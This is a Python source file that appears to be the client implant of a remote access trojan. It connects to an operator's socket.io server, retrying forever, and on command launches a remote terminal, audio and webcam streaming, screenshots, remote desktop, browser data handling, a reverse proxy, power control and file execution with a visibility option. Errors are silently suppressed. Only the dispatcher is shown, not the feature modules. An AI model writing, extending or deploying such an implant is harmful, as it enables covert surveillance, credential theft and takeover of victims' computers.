import socketio
import threading
import time
from .plugins.info import ClientInfo
from .plugins.converter import Converter
from .plugins.shared import SharedData
from .plugins.shell import ShellHandler
from .features.chat import Chat
from .features.audio import start_audio_stream
from .features.terminal import terminal
from .features.screenshot import send_screenshot
from .features.webcam import send_webcam_frame
from .features.client_desktop import start_client_desktop
from .features.power import power
from .features.browsers import browsers
from .features.proxy import start_reverse_proxy
from .features.client_center import ClientCenter
from .features.execute import execute_file

class ClientHandler:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client = socketio.Client()
        self.client_info = ClientInfo()
        self.shell_handler = ShellHandler()
        self.client_details = self.client_info.get_details()
        self.shared = SharedData()
        self.converter = Converter()
        self.chat_handler = Chat(self.client, self.converter, self.shared)

        self.client.on('connect', self.connect)
        self.client.on('message', self.message)
        self.client.on('connect_error', self.connect_error)
        self.client.on('disconnect', self.disconnect)

        self.connect_to_server()

    def connect_error(self, data):
        pass
    
    def disconnect(self):
        print("client disconnected")

    def connect(self):
        client_info = {"new_client": self.client_details}
        self.client.emit('message', Converter.encode(client_info))

    def message(self, data):


        try:
            message = self.converter.decode(data)

            if message.get("audiostream"):
                if message.get("stop_audio"):
                    self.shared.set_data("start_audio", False, True)
                    return
                self.shared.set_data("start_audio", True, False)
                thread = threading.Thread(target=start_audio_stream, args=(self.client, self.shared, self.converter), daemon=True)
                thread.start()

            elif message.get("terminal"):
                thread = threading.Thread(target=terminal, args=(self.client, message, self.shell_handler, self.converter), daemon=True)
                thread.start()

            elif message.get("screenshot"):
                threading.Thread(target=send_screenshot, args=(self.client, self.converter), daemon=True).start()

            elif message.get("webcam"):
                thread = threading.Thread(target=send_webcam_frame, args=(self.client, self.converter), daemon=True)
                thread.start()

            elif message.get("client_desktop") and message.get("port"):
                thread = threading.Thread(target=start_client_desktop, args=(self.client, message, self.host, self.converter), daemon=True)
                thread.start()

            elif message.get("power"):
                thread = threading.Thread(target=power, args=(self.client, message, self.converter), daemon=True)
                thread.start()

            elif message.get("browsers"):
                thread = threading.Thread(target=browsers, args=(self.client, message, self.converter), daemon=True)
                thread.start()

            elif message.get("reverse_proxy") and message.get("port"):
                thread = threading.Thread(target=start_reverse_proxy, args=(self.client, message, self.host, self.converter), daemon=True)
                thread.start()

            elif message.get("client"):
                thread = threading.Thread(target=ClientCenter, args=(self.client, message, self.converter), daemon=True)
                thread.start()

            elif message.get("execute_file") and message.get("visibility"):
                thread = threading.Thread(target=execute_file, args=(self.client, message, self.converter), daemon=True)
                thread.start()

            elif message.get("chat"):
                chat_online = message.get("chat_online")
                chat_messages = message.get("chat_messages")

                self.chat_handler.chat_online = chat_online

                if chat_messages:
                    self.shared.set_data("chat_messages", chat_messages, True)

                if not self.chat_handler.chat_window_open:
                    thread = threading.Thread(target=self.chat_handler.chat, daemon=True)
                    thread.start()

        except Exception as e:
            pass

    def connect_to_server(self):
        if not self.host.startswith(('http://', 'https://')):
            host = f'http://{self.host}'
        
        while True:
            try:
                self.client.connect(f'{host}:{self.port}')
                break
            except:
                print("Attempting to connect...")
                time.sleep(1)

def start_listener(HOST, PORT):
    ClientHandler(HOST, PORT)
    while True:
        time.sleep(1)